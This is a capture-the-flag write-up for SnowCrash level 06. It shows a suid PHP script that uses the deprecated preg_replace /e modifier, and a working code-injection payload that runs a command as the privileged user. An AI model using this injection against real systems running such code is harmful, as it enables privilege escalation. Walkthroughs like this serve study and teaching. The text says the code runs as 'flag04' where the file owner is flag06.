# LEVEL 06

## Vulnerability & exploit

Deprecated /e regex modifier in script owned by privileged user -> Privilege escalation via PHP code injection

## Initial Context

In our home directory, we have an executable with suid and extended permissions, and a php script allowing us to know that the executable does.

```
level06@SnowCrash:~$ ls -la level06*
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
    }
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a;
}
$r = x($argv[1], $argv[2]); print $r;
?>
```

## Solving the challenge

In the first function called by the script, we see the use of a regex with /e modifier.
The [official doc](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php) tells us this modifier is depecrated, and why:

> If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string.  
> Caution: Use of this modifier is discouraged, as it can easily introduce remote code execution vulnerabilities.

We now know that we can exploit this by passing our own code, which will be evaluated as PHP code and executed as user flag04, thanks to the suid bit.
For this, our argument should pass the regex test `"/(\[x (.*)\])/e"`, so we know it should respect the form `[x <our program in correct PHP syntax>]`
Additionally, the doc specifies that the argument should respect PHP syntax, so we can look into the [complex syntax](from https://www.php.net/manual/en/language.types.string.php) for parsing variables, which includes examples such as:

```
echo "This is the value of the var named by the return value of getName(): {${getName()}}";
```

Adapting this to our situation, we can combine this information to write `[x {${/`getflag/`}}]` into a file:

```
level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/getflag
level06@SnowCrash:~$ cat /tmp/getflag
[x {${`getflag`}}]
```

Note that since our only intent is to exploit the /e regex and not to make the exploited program work, we don't need to look further into the second argument or the y subroutine.
When we run the executable, passing our file as argument:

```
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
